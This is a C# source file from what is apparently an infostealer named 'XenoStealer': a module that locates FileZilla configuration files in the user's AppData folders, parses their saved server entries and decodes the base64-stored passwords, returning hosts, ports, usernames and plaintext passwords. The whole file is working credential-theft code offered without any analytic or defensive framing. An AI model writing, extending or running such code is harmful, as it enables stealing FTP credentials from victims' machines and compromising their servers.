using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Xml;

namespace XenoStealer
{
    public static class FileZilla
    {
        private static string[] possiblePaths;

        static FileZilla() 
        {
            string[] filenames = new string[] { "sitemanager.xml", "recentservers.xml", "filezilla.xml" };
            string[] possibleRootPaths = new string[] { Configuration.localAppData, Configuration.roamingAppData, Configuration.commonAppdata };
            possiblePaths = new string[filenames.Length * possibleRootPaths.Length];
            for (int i = 0; i < possibleRootPaths.Length; i++) 
            {
                for (int x = 0; x < filenames.Length; x++)
                {
                    possiblePaths[i * filenames.Length + x] = Path.Combine(possibleRootPaths[i], "FileZilla", filenames[x]);
                }
            }
        }


        public static DataExtractionStructs.FileZillaInfo[] GetInfo() 
        {
            List<DataExtractionStructs.FileZillaInfo> fileZillaInfos = new List<DataExtractionStructs.FileZillaInfo>();

            foreach (string path in possiblePaths) 
            {
                if (!File.Exists(path)) 
                {
                    continue;
                }

                string xmlData = Utils.ForceReadFileString(path);

                if (xmlData == null) 
                {
                    continue;
                }

                XmlDocument Parsed = new XmlDocument();
                try
                {
                    Parsed.LoadXml(xmlData);
                }
                catch 
                {
                    continue;
                }

                foreach (XmlNode node in Parsed.GetElementsByTagName("Server"))
                {
                    if (node.HasChildNodes)
                    {
                        string Host = null;
                        int Port = int.MaxValue;
                        string User = null;
                        string Password = null;
                        foreach (XmlNode children in node.ChildNodes)
                        {
                            if (children.Name == "Host")
                            {
                                Host = children.InnerText;
                            }
                            else if (children.Name == "Port")
                            {
                                int.TryParse(children.InnerText, out Port);
                            }
                            else if (children.Name == "User")
                            {
                                User = children.InnerText;
                            }
                            else if (children.Name == "Pass")
                            {
                                XmlNode encodingData = children.Attributes.Item(0);
                                if (encodingData == null) 
                                {
                                    continue;
                                }
                                if (encodingData.Name != "encoding")
                                {
                                    continue;
                                }
                                if (encodingData.Value != "base64")
                                {
                                    continue;
                                }
                                try
                                {
                                    Password = Encoding.UTF8.GetString(Convert.FromBase64String(children.InnerText));
                                }
                                catch 
                                {
                                    continue;
                                }
                            }
                        }
                        if (Host != null && Port < short.MaxValue && User != null && Password != null)
                        {
                            fileZillaInfos.Add(new DataExtractionStructs.FileZillaInfo(Host, Port, User, Password));
                        }
                    }
                }
            }

            return fileZillaInfos.ToArray();
        }

    }
}
